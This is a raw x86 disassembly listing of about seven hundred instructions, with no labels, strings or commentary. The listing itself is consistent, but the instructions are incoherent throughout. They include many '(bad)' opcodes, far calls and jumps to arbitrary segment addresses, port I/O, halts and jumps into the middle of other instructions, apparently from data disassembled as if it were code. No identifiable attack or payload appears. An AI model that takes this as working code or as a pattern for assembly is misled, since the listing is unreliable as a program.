  410415:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410416:	add    edi,edx
  410418:	or     BYTE PTR ds:[edx+0x45],0x87
  41041d:	popa   
  41041e:	push   esp
  41041f:	push   eax
  410420:	sub    dl,BYTE PTR ds:0xb58b8b1
  410426:	push   cs
  410427:	push   ecx
  410428:	sbb    DWORD PTR [edx+0x29],edi
  41042b:	aam    0x86
  41042d:	sub    al,0xd3
  41042f:	sub    BYTE PTR [eax+0x23],al
  410432:	rcr    BYTE PTR [esp+ecx*1],cl
  410435:	push   es
  410436:	rcr    ebx,1
  410438:	fisttp DWORD PTR [ebx]
  41043a:	mov    edi,0x50f96fdf
  41043f:	hlt    
  410440:	push   ecx
  410441:	push   ebx
  410442:	inc    esp
  410443:	mov    edi,0xcd582850
  410448:	cmp    BYTE PTR [ebx],al
  41044a:	add    eax,DWORD PTR [ebx]
  41044c:	(bad)  
  41044d:	inc    eax
  41044e:	call   0x8c05:0xa1481f4
  410455:	lea    ecx,[ebp+0x14747461]
  41045b:	mov    ecx,0x72e50e5c
  410460:	sbb    DWORD PTR [ebx],ecx
  410462:	or     ecx,DWORD PTR [ebx]
  410464:	ret    
  410465:	ret    
  410466:	ret    
  410467:	ret    
  410468:	(bad)  
  410469:	ds aaa 
  41046b:	aaa    
  41046c:	pop    ss
  41046d:	stos   DWORD PTR es:[edi],eax
  41046e:	push   esp
  41046f:	sub    al,BYTE PTR [ebp-0x60]
  410472:	sub    DWORD PTR [ebp-0x49],ebx
  410475:	or     al,0xa0
  410477:	(bad)  
  410479:	fistp  QWORD PTR [edi-0xa01416]
  41047f:	cli    
  410480:	std    
  410481:	mov    ebx,0x72feef77
  410486:	ja     0x4104ff
  410488:	mov    bh,0xdb
  41048a:	out    dx,eax
  41048b:	test   ebx,0x7159f3e7
  410491:	add    ebp,edx
  410493:	call   0x69d3:0xa4ffa34a
  41049a:	arpl   WORD PTR [eax+0x78],di
  41049d:	clc    
  41049e:	fdivr  st,st(3)
  4104a0:	out    dx,eax
  4104a1:	mov    edi,0x6a6a607f
  4104a6:	push   0xffffffcc
  4104a8:	xor    al,0x4d
  4104aa:	or     eax,0x445d8d0d
  4104af:	inc    ebx
  4104b0:	shr    ebx,cl
  4104b2:	pop    eax
  4104b3:	dec    edx
  4104b4:	add    ah,bl
  4104b6:	add    eax,0x91001190
  4104bb:	inc    eax
  4104bc:	popa   
  4104bd:	int    0x9a
  4104bf:	xor    eax,0xfa3e8fdd
  4104c4:	call   0xd33b63dc
  4104c9:	xchg   edi,eax
  4104ca:	mov    esi,0xc34dc007
  4104cf:	test   BYTE PTR [ecx],dl
  4104d1:	in     al,dx
  4104d2:	and    dl,dl
  4104d4:	sbb    al,0xe2
  4104d6:	(bad)  
  4104d7:	sub    ebp,esi
  4104d9:	outs   dx,DWORD PTR ds:[esi]
  4104da:	inc    edi
  4104db:	add    al,0xb2
  4104dd:	jge    0x4104b3
  4104df:	pushf  
  4104e0:	out    0x72,eax
  4104e2:	mov    ecx,0x65d5d5d0
  4104e7:	xchg   ebp,eax
  4104e8:	mov    ds:0x97e98591,eax
  4104ed:	imul   eax,DWORD PTR [edx-0x56],0x3
  4104f1:	scas   eax,DWORD PTR es:[edi]
  4104f2:	mov    bh,0xb8
  4104f4:	dec    ebp
  4104f5:	scas   al,BYTE PTR es:[edi]
  4104f6:	or     ebp,0x4c
  4104f9:	cmp    cl,BYTE PTR [ebp-0x5c]
  4104fc:	inc    ecx
  4104fd:	dec    edx
  4104fe:	inc    ecx
  4104ff:	xlat   BYTE PTR ds:[ebx]
  410500:	jne    0x4104ce
  410502:	int    0xcd
  410504:	popa   
  410505:	jbe    0x41057d
  410507:	(bad)  
  410508:	dec    edx
  410509:	fsub   DWORD PTR [ecx]
  41050b:	and    DWORD PTR [edi+edx*8],esp
  41050e:	jno    0x4104e5
  410510:	stos   BYTE PTR es:[edi],al
  410511:	push   ebp
  410512:	pop    eax
  410513:	mov    bl,0x66
  410515:	dec    ebp
  410516:	lods   eax,DWORD PTR ds:[esi]
  410517:	stc    
  410518:	scas   eax,DWORD PTR es:[edi]
  410519:	adc    dh,BYTE PTR ds:[ebx]
  41051c:	add    eax,0x84fe6927
  410521:	bound  esi,QWORD PTR [ecx-0x2afcee98]
  410527:	push   edi
  410528:	pushf  
  410529:	popf   
  41052a:	call   0x2fd0:0x91947bf
  410531:	pop    ecx
  410532:	sub    DWORD PTR [edi+ebp*4+0x7c],esi
  410536:	ds pop edi
  410538:	jns    0x410523
  41053a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41053b:	xchg   edi,eax
  41053c:	sahf   
  41053d:	pushf  
  41053e:	sahf   
  41053f:	sahf   
  410540:	into   
  410541:	mov    eax,ds:0x145c25d6
  410546:	jle    0x410561
  410548:	add    DWORD PTR [ecx+edx*8+0x8],edx
  41054c:	add    BYTE PTR [ebx],al
  41054e:	int    0x96
  410550:	loop   0x410579
  410552:	and    al,BYTE PTR [edx+0x3d401095]
  410558:	jp     0x410507
  41055a:	sub    BYTE PTR ds:0xa00b26c1,dh
  410560:	(bad)  
  410561:	jb     0x41050d
  410563:	jmp    0x4105aa
  410565:	and    al,0x93
  410567:	xor    ebp,DWORD PTR [eax-0x73cf35ac]
  41056d:	or     dl,BYTE PTR [ebp+edx*2-0x7b]
  410571:	popa   
  410572:	push   esp
  410573:	lods   al,BYTE PTR ds:[esi]
  410574:	and    BYTE PTR [eax],ah
  410576:	std    
  410577:	dec    ecx
  410578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410579:	add    eax,0xac4847f8
  41057e:	dec    edi
  41057f:	inc    ecx
  410580:	lahf   
  410581:	inc    eax
  410582:	and    BYTE PTR [eax-0x5b5d703c],dh
  410588:	sbb    al,0x1a
  41058a:	pop    eax
  41058b:	xchg   ecx,eax
  41058c:	mov    dl,0xfb
  41058e:	inc    edx
  41058f:	mov    eax,ds:0x90c7d350
  410594:	retf   
  410595:	in     eax,0x30
  410597:	cmp    DWORD PTR [ecx],edi
  410599:	mov    ecx,ecx
  41059b:	leave  
  41059c:	dec    ecx
  41059d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41059e:	shr    DWORD PTR [ecx+0x54],cl
  4105a1:	sub    dl,BYTE PTR ds:0xe9d9b364
  4105a7:	push   0xc8c1fa34
  4105ac:	enter  0x7c8,0xba
  4105b0:	scas   al,BYTE PTR es:[edi]
  4105b1:	push   ebx
  4105b2:	jbe    0x410552
  4105b4:	jge    0xee2b61d1
  4105ba:	in     eax,dx
  4105bb:	in     eax,dx
  4105bc:	fnstcw WORD PTR [ebx-0x10681089]
  4105c2:	mov    ebx,0xd73bbeef
  4105c7:	scas   al,BYTE PTR es:[edi]
  4105c8:	pop    ebp
  4105c9:	sbb    esp,DWORD PTR [ecx]
  4105cb:	pop    edi
  4105cc:	int    0xeb
  4105ce:	cmc    
  4105cf:	mov    ds:0x5b232e5c,al
  4105d4:	pop    ds
  4105d5:	and    ebx,DWORD PTR fs:[ebx+0x7f1d5acd]
  4105dc:	out    0xe7,al
  4105de:	out    0xa7,eax
  4105e0:	fidivr WORD PTR [ebx+esi*8-0x33]
  4105e4:	pop    edi
  4105e5:	lea    ecx,[esp+ecx*4-0x6aa85564]
  4105ec:	add    al,0x96
  4105ee:	or     edi,DWORD PTR ds:0xc9b7175f
  4105f4:	add    eax,0x594166a0
  4105f9:	xchg   ebx,eax
  4105fa:	pusha  
  4105fb:	jno    0x4105cc
  4105fd:	sahf   
  4105fe:	cmp    eax,0xe8fa3d77
  410603:	mov    ds:0xb55aac2f,eax
  410608:	jmp    0x50ae:0x439c940b
  41060f:	sub    ebp,ebp
  410611:	or     dh,BYTE PTR cs:[edi+edi*2]
  410615:	fbld   TBYTE PTR [edx+0x45d72f60]
  41061b:	push   0xc4886965
  410620:	loopne 0x410615
  410622:	stc    
  410623:	lods   al,BYTE PTR ds:[esi]
  410624:	call   FWORD PTR [ebp+0x2e5ca088]
  41062a:	mov    ds:0x54a02850,eax
  41062f:	sub    bl,BYTE PTR [ecx-0x3d]
  410632:	ret    
  410633:	mov    DWORD PTR [edx],ecx
  410635:	adc    DWORD PTR [ebx-0x145e8d40],0x9f3e7c3a
  41063f:	aad    0xe7
  410641:	test   BYTE PTR [ebx+0x4152a54a],dl
  410647:	cmp    bl,BYTE PTR [ebp+0x2c2c2c6]
  41064d:	mov    dh,0xc6
  410650:	jmp    0xdddd:0xd1079c43
  410657:	lea    edi,[esi-0x90bc142]
  41065d:	neg    BYTE PTR [edx+0x4d]
  410660:	mov    eax,0x569d9d9d
  410665:	ins    BYTE PTR es:[edi],dx
  410666:	xor    BYTE PTR [edx+0x40],0x4a
  41066a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41066b:	xchg   edx,eax
  41066c:	xor    eax,0x7e170fa2
  410671:	icebp  
  410672:	cmp    edx,DWORD PTR [esi-0x14287bef]
  410678:	mov    ch,0x5c
  41067a:	push   ecx
  41067b:	mov    bh,0xdb
  41067d:	lea    esp,[ebx-0x90170b9]
  410683:	popf   
  410684:	ja     0x410664
  410686:	jns    0x410697
  410688:	inc    eax
  410689:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41068a:	pop    esi
  41068b:	jne    0x41068b
  41068d:	mov    edi,0x75f39093
  410692:	dec    edx
  410693:	fst    DWORD PTR [esi+0x4b027565]
  410699:	arpl   WORD PTR [esi],ax
  41069b:	sub    eax,edx
  41069d:	dec    edx
  41069e:	adc    al,BYTE PTR [ecx-0x5517fe1a]
  4106a4:	stos   BYTE PTR es:[edi],al
  4106a5:	clc    
  4106a6:	or     al,0xa3
  4106a8:	bound  esi,QWORD PTR [ecx+0x57fdef23]
  4106ae:	sub    ah,ch
  4106b0:	popa   
  4106b1:	call   0x7340:0x2b7ad5
  4106b8:	or     BYTE PTR [edx+0x64c99cdf],dl
  4106be:	push   0x35
  4106c0:	gs jg  0x41067d
  4106c3:	stos   BYTE PTR es:[edi],al
  4106c4:	stos   BYTE PTR es:[edi],al
  4106c5:	(bad)  
  4106c6:	xor    BYTE PTR [edx+0x64],bl
  4106c9:	inc    esi
  4106ca:	adc    ch,BYTE PTR [eax]
  4106cc:	imul   ebp,DWORD PTR [edi],0xffffff99
  4106cf:	dec    esp
  4106d0:	pop    edx
  4106d1:	leave  
  4106d2:	adc    al,0xa1
  4106d4:	push   eax
  4106d5:	or     BYTE PTR [ebx],al
  4106d7:	add    eax,DWORD PTR [ebx]
  4106d9:	dec    ebp
  4106da:	or     BYTE PTR [edi],0xd4
  4106dd:	sbb    BYTE PTR ds:[eax+0x2c],0x86
  4106e2:	jae    0x4106cb
  4106e4:	into   
  4106e5:	and    DWORD PTR [ebx-0x282caf37],edx
  4106eb:	inc    edx
  4106ec:	xor    al,0x1a
  4106ee:	cmp    eax,0xa5d2e97c
  4106f3:	ud2    
  4106f5:	test   DWORD PTR [edx+0xe],eax
  4106f8:	lea    ebp,[esi]
  4106fa:	mov    ecx,0xba670cd4
  4106ff:	(bad)  [esi-0x21]
  410702:	imul   ch
  410704:	fld    TBYTE PTR [edi-0x4]
  410707:	into   
  410708:	ja     0x4106c8
  41070a:	repz cmc 
  41070c:	sbb    ebp,DWORD PTR [esi-0x48]
  41070f:	popa   
  410710:	xor    eax,0x142604d
  410715:	and    edx,esi
  410717:	scas   eax,DWORD PTR es:[edi]
  410718:	dec    ecx
  410719:	jmp    0x4106ea
  41071b:	iret   
  41071c:	iret   
  41071d:	arpl   WORD PTR [esi+0x66],sp
  410720:	data16 div ah
  410723:	jmp    0xf4c0b6fb
  410728:	rol    DWORD PTR [edi-0x39],1
  41072b:	repnz stc 
  41072d:	cld    
  41072e:	and    bl,BYTE PTR [eax+0x53]
  410731:	sbb    al,0x9a
  410733:	jge    0x4107b0
  410735:	(bad)  
  410737:	dec    ebx
  410738:	add    eax,0x917ffd4b
  41073d:	add    BYTE PTR [edx+edi*1],dl
  410740:	jle    0x410741
  410742:	std    
  410743:	neg    edi
  410745:	repz clc 
  410747:	jecxz  0x4106d8
  410749:	mov    edi,0xbb972e5a
  41074e:	retf   
  41074f:	in     eax,0xf2
  410751:	xchg   edx,eax
  410752:	adc    DWORD PTR [edx+0x75c57eed],eax
  410758:	jno    0x410779
  41075a:	pop    ss
  41075b:	and    al,BYTE PTR cs:[esi+ecx*2]
  41075f:	rcr    ah,cl
  410761:	mov    WORD PTR [edi],ss
  410763:	test   esi,ebx
  410765:	cs mov dh,0x60
  410768:	inc    edi
  410769:	adc    al,0x94
  41076b:	sbb    BYTE PTR [esp+eiz*4+0x15],al
  41076f:	mov    DWORD PTR [esp+ebp*1-0xd],eax
  410773:	fwait
  410774:	call   0x5ff7:0xe73fc94a
  41077b:	add    DWORD PTR cs:[eax+0x142851eb],edx
  410782:	lods   al,BYTE PTR ds:[esi]
  410783:	add    DWORD PTR [eax+edi*2-0x75],ebx
  410787:	add    ebp,DWORD PTR ds:0x4d34589c
  41078d:	inc    ebx
  41078e:	cs xchg edi,eax
  410790:	inc    ebx
  410791:	sub    al,0x16
  410793:	mov    bl,0xc6
  410795:	jp     0x410783
  410797:	jmp    0x410784
  410799:	inc    ebx
  41079a:	cmp    BYTE PTR [esi+eax*2],bl
  41079d:	sub    BYTE PTR [edx+eax*2],dl
  4107a0:	xor    BYTE PTR [eax],bl
  4107a2:	inc    esp
  4107a3:	and    BYTE PTR [eax],dl
  4107a5:	mov    al,0xd2
  4107a7:	(bad)  
  4107a8:	sub    esi,ebx
  4107aa:	les    ebx,FWORD PTR [ebx+0x20962977]
  4107b0:	ds stos DWORD PTR es:[edi],eax
  4107b2:	dec    eax
  4107b3:	pop    esi
  4107b4:	xor    al,0xb2
  4107b6:	jae    0x4107e2
  4107b8:	xchg   ebp,eax
  4107b9:	ret    0xfdfe
  4107bc:	sti    
  4107bd:	jmp    FWORD PTR [edi-0x5b]
  4107c0:	push   edx
  4107c1:	jno    0x410764
  4107c3:	adc    DWORD PTR [eax+0x26],esp
  4107c6:	mov    eax,ds:0xb65c8516
  4107cb:	cs xchg edx,eax
  4107cd:	add    eax,edx
  4107cf:	dec    esp
  4107d0:	push   es
  4107d1:	ror    BYTE PTR [edx],0x89
  4107d4:	pusha  
  4107d5:	fld    DWORD PTR [eax+eiz*2]
  4107d8:	sbb    BYTE PTR [esi-0x54a952af],al
  4107de:	and    BYTE PTR [edx+0x31],0xa4
  4107e2:	popa   
  4107e3:	push   esp
  4107e4:	jmp    0xed4f:0x1f4d1bda
  4107eb:	test   ebp,edx
  4107ed:	rol    BYTE PTR [eax-0x46505337],cl
  4107f3:	or     DWORD PTR ds:0x2ba8a7c6,ecx
  4107f9:	stc    
  4107fa:	inc    esi
  4107fb:	mov    esp,0xdd469f0d
  410800:	leave  
  410801:	xlat   BYTE PTR ds:[ebx]
  410802:	sti    
  410803:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410804:	push   ebx
  410805:	scas   eax,DWORD PTR es:[edi]
  410806:	cmp    al,0x8a
  410808:	or     DWORD PTR [eax+0x56ad5539],edx
  41080e:	sub    eax,0x48913edf
  410813:	and    BYTE PTR [edi+0x2c58a1cb],dl
  410819:	push   0xfffffff1
  41081b:	js     0x410819
  41081d:	je     0x410841
  41081f:	xchg   ecx,eax
  410820:	sbb    BYTE PTR [edi+0x58],bl
  410823:	pop    eax
  410824:	cwde   
  410825:	aam    0x34
  410827:	sub    eax,0x7e09a85
  41082c:	rcl    DWORD PTR [eax],1
  41082e:	jl     0x4108ad
  410830:	fnstsw WORD PTR [edx-0x941e48b]
  410836:	mov    ch,0xaf
  410838:	jge    0x410833
  41083a:	(bad)  
  41083b:	sbb    ebp,DWORD PTR [edi-0x24]
  41083e:	mov    al,0x79
  410840:	repz out 0x35,al
  410843:	popf   
  410844:	popf   
  410845:	popf   
  410846:	xchg   esi,eax
  410847:	fstp   DWORD PTR [eax-0x49]
  41084a:	sbb    dl,BYTE PTR [eax+0x2c]
  41084d:	push   ss
  41084e:	mov    cl,0xb8
  410850:	mov    eax,0x59d9d988
  410855:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410856:	shr    ecx,cl
  410858:	jmp    0x3f8f:0x89e8e8e8
  41085f:	(bad)  
  410860:	clc    
  410861:	std    
  410862:	mov    DWORD PTR [ecx-0x60cf077],ecx
  410868:	cld    
  410869:	add    bl,BYTE PTR [edx]
  41086b:	mov    esi,0x316c1739
  410870:	rol    bh,1
  410872:	test   DWORD PTR [ebp-0x132e8184],ebx
  410878:	out    0xc2,eax
  41087a:	pop    edi
  41087b:	add    eax,0x6db6d950
  410880:	fwait
  410881:	out    dx,eax
  410882:	mov    eax,ds:0xf27a1e87
  410887:	out    dx,al
  410888:	mov    ebx,0x5d47feef
  41088d:	xlat   BYTE PTR ds:[ebx]
  41088e:	mov    ebx,0x256a92c9
  410893:	cld    
  410894:	sbb    al,0x76
  410896:	inc    esp
  410897:	and    BYTE PTR [ebx],bh
  410899:	xchg   edi,eax
  41089a:	cvtps2pd xmm1,xmm2
  41089d:	popa   
  41089e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41089f:	icebp  
  4108a0:	mov    ecx,0xb3615f99
  4108a5:	and    DWORD PTR [ecx+0x64170596],ecx
  4108ab:	push   ecx
  4108ac:	dec    eax
  4108ad:	fsubr  QWORD PTR [esi+0x37]
  4108b0:	cld    
  4108b1:	(bad)  
  4108b2:	fisub  DWORD PTR [eax-0x2fbd2360]
  4108b8:	jmp    0x41084b
  4108ba:	cld    
  4108bb:	push   edx
  4108bc:	test   eax,0x672e5c84
  4108c1:	or     DWORD PTR [edx-0x184d1308],ebx
  4108c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108c8:	rcr    DWORD PTR [eax+0x49],0x91
  4108cc:	enter  0x9116,0xc
  4108d0:	call   0xac9d6310
  4108d5:	gs in  eax,0x26
  4108d8:	xchg   ebx,eax
  4108d9:	dec    ecx
  4108da:	jmp    0x410917
  4108dc:	and    BYTE PTR [ebx],cl
  4108de:	shr    bh,1
  4108e0:	mul    DWORD PTR [ebx]
  4108e2:	xchg   ebx,eax
  4108e3:	leave  
  4108e4:	or     al,0xb9
  4108e6:	fucomp st(6)
  4108e8:	mov    ecx,0xdfd7ebf5
  4108ed:	mov    dh,0x76
  4108ef:	in     eax,dx
  4108f0:	fisubr DWORD PTR [esi-0x61]
  4108f3:	iret   
  4108f4:	out    0x2a,eax
  4108f6:	adc    al,0xa
  4108f8:	shl    BYTE PTR [ebp-0x23],1
  4108fb:	pop    edx
  4108fc:	sub    al,ch
  4108fe:	dec    eax
  4108ff:	out    dx,al
  410900:	inc    ebx
  410901:	and    BYTE PTR [eax],dl
  410903:	mov    al,0xac
  410905:	xchg   edx,eax
  410906:	push   0xe7f97a34
  41090b:	aas    
  41090c:	(bad)  
  41090d:	stc    
  41090e:	mov    bl,0xa7
  410910:	dec    esi
  410911:	popf   
  410912:	cmp    cl,BYTE PTR [esi+0x26e7f686]
  410918:	ds ja  0x41091c
  41091b:	(bad)  
  41091c:	cmc    
  41091d:	push   esi
  41091e:	out    dx,al
  41091f:	sub    DWORD PTR [edx],0xddae8f39
  410925:	push   ss
  410926:	retf   
  410927:	or     BYTE PTR es:[ebx-0x2231d0e9],0x72
  41092f:	retf   
  410930:	sub    eax,0xf2e5cbba
  410935:	push   ebx
  410936:	and    al,0xd5
  410938:	xor    al,0xd
  41093a:	aam    0x9a
  41093c:	retf   0xda6b
  41093f:	sahf   
  410940:	pop    es
  410941:	add    eax,0xb65f026b
  410946:	bound  eax,QWORD PTR [eax]
  410948:	cld    
  410949:	inc    ebx
  41094a:	icebp  
  41094b:	aam    0x13
  41094d:	xor    ah,al
  41094f:	pop    esi
  410950:	jns    0x410917
  410952:	(bad)  
  410954:	mov    ah,BYTE PTR [ebx+ebx*1+0x30608186]
  41095b:	mov    BYTE PTR [ecx+0x75740181],al
  410961:	jne    0x410924
  410963:	jmp    0x41095a
  410965:	pop    edx
  410966:	les    eax,FWORD PTR [ecx+0x6d]
  410969:	(bad)  
  41096a:	xchg   ebx,eax
  41096b:	xchg   ebx,eax
  41096c:	xchg   ebx,eax
  41096d:	mov    ch,al
  41096f:	(bad)  
  410970:	aam    0xde
  410972:	pop    ebp
  410973:	leave  
  410974:	out    0xf3,eax
  410976:	pop    ss
  410977:	xchg   DWORD PTR [esi+0x264cde86],eax
  41097d:	xchg   ebx,eax
  41097e:	xchg   ebx,eax
  41097f:	test   al,0x9
  410981:	daa    
  410982:	cmc    
  410983:	xchg   DWORD PTR [edi+0x7777a697],esp
  410989:	ja     0x410982
  41098b:	fdiv   QWORD PTR [edi-0x21]
  41098e:	jge    0x410a07
  410990:	cmp    al,0xf4
  410992:	rol    BYTE PTR [ebx+0x77],1
  410995:	outs   dx,BYTE PTR ds:[esi]
  410996:	fdivr  QWORD PTR [eax-0x5dc1bbcf]
  41099c:	(bad)  
  41099d:	jecxz  0x410950
  41099f:	es cli 
  4109a1:	sub    BYTE PTR [edx+ecx*1],dl
  4109a4:	push   esi
  4109a5:	loopne 0x4109d7
  4109a7:	popf   
  4109a8:	dec    esi
  4109a9:	arpl   WORD PTR [esp+esi*2+0x74],si
  4109ad:	call   0xafd4d396
  4109b2:	mov    WORD PTR [edi+0x3511ff8f],cs
  4109b8:	mov    edi,0x88b8989e
  4109bd:	lods   ax,WORD PTR ds:[esi]
  4109bf:	iret   
  4109c0:	or     DWORD PTR [eax-0x2c],eax
  4109c3:	hlt    
  4109c4:	mov    ah,0x90
  4109c6:	ror    BYTE PTR [ebx-0x6029bfb7],0xbb
  4109cd:	arpl   di,ax
  4109cf:	mov    es,eax
  4109d1:	push   ebx
  4109d2:	dec    edi
  4109d3:	cmp    eax,0x3d3daff5
  4109d8:	cmp    eax,0x5a69a37f
  4109dd:	sar    DWORD PTR [edi+eax*1+0x2b7f34ed],cl
  4109e4:	or     esp,DWORD PTR [eax+0x39]
  4109e7:	out    0x88,eax
  4109e9:	in     eax,0x85
  4109eb:	imul   ebp,DWORD PTR [esi+edx*4-0x17db4408],0x92269cd4
  4109f6:	add    bl,BYTE PTR [ecx+0x12]
  4109f9:	mov    esp,0x6090b8bc
  4109fe:	jp     0x4109bd
  410a00:	faddp  st(6),st
  410a02:	cld    
  410a03:	or     dh,BYTE PTR [ebp+0x52]
  410a06:	enter  0x72e5,0xd0
  410a0a:	xor    al,0xcd
  410a0c:	pop    edx
  410a0d:	dec    eax
  410a0e:	mov    DWORD PTR [eax-0x48ab1413],ecx
  410a14:	inc    edx
  410a15:	mov    eax,ds:0xedf54560
  410a1a:	or     BYTE PTR [eax+0x8d03af],al
  410a20:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  410a22:	push   edx
  410a23:	mov    cl,0x12
  410a25:	sub    DWORD PTR [edx-0x4f],0xffffffae
  410a29:	xor    dh,BYTE PTR [edi+0x2d]
  410a2c:	cmp    ebx,DWORD PTR [edi+0x78]
  410a2f:	loope  0x4109b6
  410a31:	push   DWORD PTR [esi]
  410a33:	xor    eax,0xf7bc9535
  410a38:	fidivr WORD PTR [ebx-0x49]
  410a3b:	in     eax,dx
  410a3c:	fdiv   DWORD PTR [ecx-0x4110501d]
  410a42:	sti    
  410a43:	out    dx,al
  410a44:	ins    DWORD PTR es:[edi],dx
  410a45:	add    eax,DWORD PTR [ebx]
  410a47:	add    ebx,DWORD PTR [ebx-0x5]
  410a4a:	sti    
  410a4b:	sti    
  410a4c:	pop    es
  410a4d:	inc    edx
  410a4e:	mov    eax,ds:0x8c088790
  410a53:	xor    al,BYTE PTR [ecx+0x23]
  410a56:	cmc    
  410a57:	out    0xc6,al
  410a59:	mov    DWORD PTR [ecx+0x2f8bec89],ecx
  410a5f:	mov    esi,0x87c3fdf8
  410a64:	movsx  ecx,WORD PTR [ecx-0x4d8c0f66]
  410a6b:	xchg   edi,eax
  410a6c:	cdq    
  410a6d:	std    
  410a6e:	xor    dh,BYTE PTR [edx]
  410a70:	loopne 0x4109f4
  410a72:	scas   al,BYTE PTR es:[edi]
  410a73:	mov    al,0xf2
  410a75:	je     0x410a13
  410a77:	xchg   esp,eax
  410a78:	or     BYTE PTR [edi-0x3f6d25e6],dh
  410a7e:	dec    edx
  410a7f:	sub    al,0x0
  410a81:	mov    bl,0xd9
  410a83:	xchg   DWORD PTR [eax+eax*2],esi
  410a86:	in     eax,dx
  410a87:	(bad)  
  410a88:	cmc    
  410a89:	iret   
  410a8a:	add    ebp,ecx
  410a8c:	add    eax,DWORD PTR [edx-0x12b715cc]
  410a92:	lock jl 0x410afb
  410a95:	push   esp
  410a96:	rcr    BYTE PTR [eax],cl
  410a98:	hlt    
  410a99:	xchg   edx,eax
  410a9a:	imul   ecx,DWORD PTR [edi*1-0x1280b8e6],0xeee8b5da
  410aa5:	out    dx,al
  410aa6:	outs   dx,BYTE PTR ds:[esi]
  410aa7:	sbb    dh,BYTE PTR [edx+eiz*4+0x3e]
  410aab:	mov    al,ds:0x3f9fce26
  410ab0:	(bad)
  410ab4:	inc    edx
  410ab5:	mov    eax,ds:0xfe5c7f40
  410aba:	ret    0xb85
  410abd:	scas   eax,DWORD PTR es:[edi]
  410abe:	dec    edi
  410abf:	dec    esi
  410ac0:	dec    esi
  410ac1:	sahf   
  410ac2:	inc    esi
  410ac3:	dec    ebp
  410ac4:	sub    BYTE PTR ds:0x90cc2468,bh
  410aca:	xchg   dh,dh
  410acc:	in     al,dx
  410acd:	fnstsw WORD PTR [ebx-0x7205409]
  410ad3:	(bad)  
  410ad4:	aaa    
  410ad5:	out    dx,al
  410ad6:	mov    ecx,0x22ebbaee
  410adb:	in     al,0x9b
  410add:	xchg   ecx,eax
  410ade:	lahf   
  410adf:	dec    edx
  410ae0:	sbb    BYTE PTR [edi+0x3731e7cf],0x37
  410ae7:	xchg   DWORD PTR [ecx+0x122429a9],ebp
  410aed:	mov    esp,eax
  410aef:	mov    ecx,0x777ee773
  410af4:	jmp    0x3ea8:0xf503a9d4
  410afb:	xor    eax,0x2f2d71cd
  410b00:	adc    al,BYTE PTR [eax]
  410b02:	sub    eax,0x66a5fb06
  410b07:	inc    ebp
  410b08:	pop    edx
  410b09:	pop    ss
  410b0a:	xchg   ebx,eax
  410b0b:	jg     0x410b85
  410b0d:	fs mov bh,0xfa
  410b10:	enter  0x8f23,0x3c
  410b14:	fst    st(5)
  410b16:	aad    0xf5
  410b18:	aaa    
  410b19:	xor    al,0x93
  410b1b:	or     al,0x60
  410b1d:	das    
  410b1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b1f:	jbe    0x410b31
  410b21:	mov    DWORD PTR [eax+0x25],esp
  410b24:	inc    edx
  410b25:	das    
  410b26:	sahf   
  410b27:	ret    
  410b28:	and    ebx,esi
  410b2a:	xlat   BYTE PTR ds:[ebx]
  410b2b:	sub    eax,edi
  410b2d:	dec    edx
  410b2e:	and    esp,DWORD PTR [esi]
  410b30:	jae    0x410b1d
  410b32:	cmp    ah,0x7e
  410b35:	jmp    0xaddc:0x2476460
  410b3c:	mov    al,ds:0xe3c79138
  410b41:	inc    ecx
  410b42:	ja     0x410bbb
  410b44:	aaa    
  410b45:	mov    edx,0xa951bbbb
  410b4a:	push   esp
  410b4b:	lods   al,BYTE PTR ds:[esi]
  410b4c:	les    ebx,FWORD PTR ds:0xb029df32
  410b52:	sub    BYTE PTR [edx+0x16e97523],dl
  410b58:	arpl   WORD PTR [ecx],ax
  410b5a:	mov    dl,0x67
  410b5c:	mov    ds:0xc677d3ba,eax
  410b61:	jmp    0x410b24
  410b63:	int    0xf9
  410b65:	(bad)  
  410b67:	fimul  WORD PTR ds:0x77eefddf
  410b6d:	jmp    FWORD PTR [ecx-0x21]
  410b70:	mov    esi,0x703fdf7d
  410b75:	loopne 0x410b37
  410b77:	pop    ds
  410b78:	push   cs
  410b79:	sbb    al,0x38
  410b7b:	jo     0x410b6f
  410b7d:	lds    edx,FWORD PTR [edi]
  410b7f:	pop    edi
  410b80:	hlt    
  410b81:	cli    
  410b82:	std    
  410b83:	(bad)  
  410b84:	loopne 0x410b73
  410b86:	mov    bh,0xdf
  410b88:	jle    0x410b67
  410b8a:	imul   ch
  410b8c:	fld    TBYTE PTR [edi-0x41]
  410b8f:	repz into 
  410b91:	cmp    esi,DWORD PTR [edi-0x6432194]
  410b97:	cli    
  410b98:	xor    eax,0x3f5cd66b
  410b9d:	cmp    BYTE PTR [eax],bh
  410b9f:	call   0x275458d9
  410ba4:	dec    edi
  410ba5:	sahf   
  410ba6:	int3   
  410ba7:	in     al,dx
  410ba8:	(bad)  [edi-0x7038f811]
  410bae:	pop    ds
  410baf:	aas    
  410bb0:	add    ah,BYTE PTR [eax+0x44dafea7]
  410bb6:	loop   0x410b9f
  410bb8:	inc    edx
  410bb9:	or     esi,DWORD PTR [esp+eax*1]
  410bbc:	pop    ecx
  410bbd:	adc    DWORD PTR [esi+0x6201b93],ecx
  410bc3:	or     BYTE PTR [ecx+0x59cec1ac],ch
  410bc9:	push   esi
  410bca:	imul   eax,ecx,0x4a
  410bcd:	bound  eax,QWORD PTR [eax]
  410bcf:	gs inc ebp
  410bd1:	push   ecx
  410bd2:	ror    BYTE PTR [edx+0x436a44a2],cl
  410bd8:	jge    0x410bf3
  410bda:	dec    ebp
  410bdb:	inc    ecx
  410bdc:	inc    eax
  410bdd:	out    dx,al
  410bde:	xor    edx,edx
  410be0:	dec    ebx
  410be1:	sub    eax,DWORD PTR es:[ecx+0x43e9618]
  410be8:	xor    al,bl
  410bea:	push   0x3ebd5ae4
  410bef:	out    dx,eax
  410bf0:	pop    esi
  410bf1:	inc    edi
  410bf2:	inc    edi
